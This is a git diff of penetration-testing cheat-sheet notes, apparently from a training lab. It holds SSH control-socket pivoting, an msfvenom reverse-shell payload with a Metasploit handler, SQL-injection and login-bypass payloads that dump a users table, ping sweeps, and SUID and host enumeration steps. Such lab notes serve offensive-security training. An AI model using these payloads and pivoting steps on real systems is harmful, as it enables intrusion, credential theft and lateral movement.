@@ -1,18 +1,3 @@
-Control Sockets (different method of port forwarding)
-Creates a file that represents the connection to a box. Created on linux opstation that has all of the tools.
-
-lin_ops#  ssh -MS /tmp/jump student@10.50.35.64                                                   #Create initial control socket with jumpbox
-lin_ops#  ssh -S /tmp/jump jump                                                                   #Connect to control socket to the jumpbox
-lin_ops#  ssh -S /tmp/jump jump -O forward -D9050                                                 #Create dynamic port forward to jumpbox  
-lin_ops#  proxychains nmap -Pn -T4 -vvvv 192.168.28.100                                           #Scan Tgt on network found
-lin_ops#  ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 2222:192.168.28.100:2222  #Create static port forwards to 80 and 2222 on 192.168.28.100
-lin_ops#  ssh -S /tmp/jump jump -O cancel -D9050                                                  #Will cancel portforward
-lin_ops#  nc 127.0.0.1 1111                                                                       #Will test connection to port 80 on 192.168.28.100
-lin_ops#  nc 127.0.0.1 2222                                                                       #Will test connection to port 222 on 192.168.28.100
-lin_ops# ssh -MS /tmp/web <creds>@127.0.0.1 -p 2222                                               #Will create control socket to web server
-lin_ops# firefox                                                                                  #Use firefox to go to 127.0.0.1:1111 to go to webserver
-
-
 NMAP SCRIPTS
   /usr/share/nmap/scripts
 smb-os-discovery
@@ -119,7 +104,7 @@ USE GHIDRA TO PERFROM ANALYSIS OF .EXE, FIND VULNERABLE FUNCTION
 !mona modules
 !mona jump -r esp -m "essfunc.dll"
 Window -> Log Data Drop Down
-msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python
+msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python           #USE PORT 21001 WHEN USING MULTI/HANDLER
 msfconsole
 use multi/hander
 set payload windows/meterpreter/reverse_tcp
@@ -291,6 +276,42 @@ set LPORT 6969
 
 ###VIEWING AUDITING POLICY###
 auditpol /get /category:* | findstr /i "success failure"
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+      ###DRY RUN NOTES###
+ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done #PING SCRIPT   #MAKE SURE YOU HAVE A BASH SHELL /bin/bash
+https://app.diagrams.net/                             #MAP SOFTWARE
+
+http://127.0.0.1:1111/pick.php?product=1' OR 1='1
+http://127.0.0.1:1111/pick.php?product=2' OR 1='1
+http://127.0.0.1:1111/pick.php?product=3' OR 1='1
+http://127.0.0.1:1111/pick.php?product=4' OR 1='1
+http://127.0.0.1:1111/pick.php?product=5' OR 1='1
+http://127.0.0.1:1111/pick.php?product=6' OR 1='1
+http://127.0.0.1:1111/pick.php?product=7' OR 1='1                            #GIVES AN ERROR
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT 1,2,3; #               #GIVES THE 3 COLUMN NAMES
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users                        #ROT13 ENCRYPTED POSSIBLE
+
+IF BOX HAS PORT 9999 CHECK FOR SERCURESERVER TO DO WINDOWS BUFFER OVERFLOW EXPLOIT
+
+(1) Scan First Potential Box | nmap -Pn -sV -T5 <targetip>
+(2) Make Tunnel To HTTP Port and Enumerate Website to Find Possible Vulnerable Input Fields
+(3) POST METHOD: Username: ' OR 1='1                                                                         #RETURNS FIRST USER WHERE USERNAME AND PASSWORD IS TRUE
+                 Password: ' OR 1='1
+(4) GET METHOD:  RESEND TRUTH STATEMENT WITH WEB DEV TOOLS, CLICK ON POST REQUEST AND SWITCH DATA TO RAW:    #ROT 13 ENCRYPTED PASSORDS POSSIBLE
+                 http://10.10.10.10/login.php?username=' OR 1='1 & passwd=' OR 1='1
+(5) CHECK FOR robots.txt
+(6) RUN nmap --scipt=http-enum
+(7) DECODE PASSWORDS
+(8) CREATE CONTROL SOCKET TO PUBLIC FACING WEB SERVER
+    ssh -MS /tmp/pub user2@10.10.10.10
+(9) ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r
+(10) cat /etc/hosts | for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done | SCAN NETWORK THAT DISCOVERED HOST WAS ON
+(11) CREATE DYNAMIC PORT TO BE ABLE TO SCAN DISCOVERED HOSTS
+(12) SCAN DISCOVERED HOSTS WITH NMAP TO DISCOVER PORTS | nmap -Pn -T5 -Sv -vvvv 192.168.28.172,181
+
+
+
 
 
 
